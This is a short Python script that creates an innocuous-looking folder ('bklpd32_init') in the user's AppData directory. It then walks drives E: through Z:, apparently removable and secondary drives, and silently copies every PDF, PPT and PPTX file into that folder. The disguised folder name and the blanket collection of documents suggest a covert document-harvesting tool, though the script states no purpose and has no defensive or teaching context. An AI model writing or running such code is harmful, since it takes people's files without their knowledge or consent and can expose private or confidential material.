import os
import shutil

dest = os.getenv("appdata")+"/bklpd32_init"
if(not os.path.exists(dest)):
    os.mkdir(dest)

for i in range(ord('E'),1+ord('Z')):
    drive = chr(i)
    for (dirpath, dirnames, filenames) in os.walk(drive+":"):
        for filename in filenames:
            print(filename)
            try:
                ext = filename[filename.rindex(".") + 1:].lower()
            except ValueError:
                continue
            if(ext == "pdf") or (ext == "ppt") or (ext == "pptx"):
                shutil.copy2(dirpath +"/" + filename, dest)

